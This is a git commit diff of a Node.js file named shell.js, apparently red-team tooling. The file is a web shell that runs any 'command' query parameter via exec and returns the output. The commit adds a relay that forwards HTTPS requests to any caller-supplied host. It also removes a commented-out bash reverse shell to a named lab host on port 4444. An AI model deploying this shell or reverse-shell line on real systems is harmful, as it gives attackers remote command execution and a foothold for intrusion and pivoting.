faef3aea0e658384f41eabb4640a44b23bbe70ba
Ben Steger <ben.steger@praetorian.com>
2021-01-18 18:17:48 -0600

    d

--- shell.js
+++ shell.js
@@ -2,43 +2,24 @@ var http = require('http'); // 1 - Import Node.js core module
 const { exec } = require("child_process");
 const url = require('url');
 
-// var server = http.createServer(function (req, res) {   // 2 - creating server
-
-//         const newURL = new URL(req.url);
-
-// 	    // var search_params = newURL.searchParams;
-//     	// var command = search_params.get('command');
-
-//         var command = "ls";
-
-//         if(command){
-//             exec(command, (error, stdout, stderr) => {
-//                 if (error) {
-//                     console.log(`error: ${error.message}`);
-//                     return;
-//                 }
-//                 if (stderr) {
-//                     console.log(`stderr: ${stderr}`);
-//                     return;
-//                 }
-//                 res.write(stdout);
-//                 // console.log(`stdout: ${stdout}`);
-//             });
-//         }
-//         res.write("Ooooops!");
-
-// });
-
-// server.listen(3000); //3 - listen for any incoming requests
-
-// console.log('Node.js web server at port 3000 is running..')
+const https = require('https')
+const options = {
+  hostname: 'whatever.com',
+  port: 443,
+  path: '/todos',
+  method: 'GET'
+}
 
 http.createServer(function (req, res) {
   const queryObject = url.parse(req.url,true).query;
   console.log(queryObject);
-  var response = '';
+  var response = ':(';
 
   var command = queryObject['command'];
+  var host = queryObject['host'];
+  var port = queryObject['port'];
+  var method = queryObject['method'];
+  var path = queryObject['path'];
         if(command){
             exec(command, (error, stdout, stderr) => {
                 if (error) {
@@ -56,22 +37,31 @@ http.createServer(function (req, res) {
                 console.log(response);
             });
         }
+        else if(host && method){
+            var options = {
+                hostname: host,
+                port: port,
+                path: path,
+                method: method
+              }
+            const req = https.request(options, response => {
+            console.log(`statusCode: ${response.statusCode}`)
+            
+            response.on('data', d => {
+                process.stdout.write(d)
+                res.writeHead(200, {'Content-Type': 'text/html'});
+                res.end(d);              
+            })
+            })
+            
+            req.on('error', error => {
+                console.error(error)
+            })
+            
+            req.end()
+        }
         else{
-  res.writeHead(200, {'Content-Type': 'text/html'});
-  res.end(response);}
+            res.writeHead(200, {'Content-Type': 'text/html'});
+            res.end(response);
+        }
 }).listen(8080);
-
-
-// const { exec } = require("child_process");
-
-// exec("bash -i >& /dev/tcp/kali6.praetorianlabs.com/4444 0>&1", (error, stdout, stderr) => {
-//     if (error) {
-//         console.log(`error: ${error.message}`);
-//         return;
-//     }
-//     if (stderr) {
-//         console.log(`stderr: ${stderr}`);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout}`);
-// });
